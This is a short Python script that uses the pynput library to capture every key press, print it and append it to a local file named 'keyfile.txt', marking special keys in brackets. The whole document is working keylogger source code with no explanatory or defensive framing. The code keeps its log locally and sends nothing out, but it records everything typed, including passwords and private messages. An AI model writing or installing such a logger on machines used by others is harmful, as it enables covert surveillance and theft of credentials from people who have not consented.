from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            # For alphanumeric keys
            char = key.char
            logKey.write(char)
        except AttributeError:
            # For special keys (space, enter, shift, etc.)
            logKey.write(f" [{key}] ")

def main():
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()  # Keeps the program running

if __name__ == "__main__":
    main()

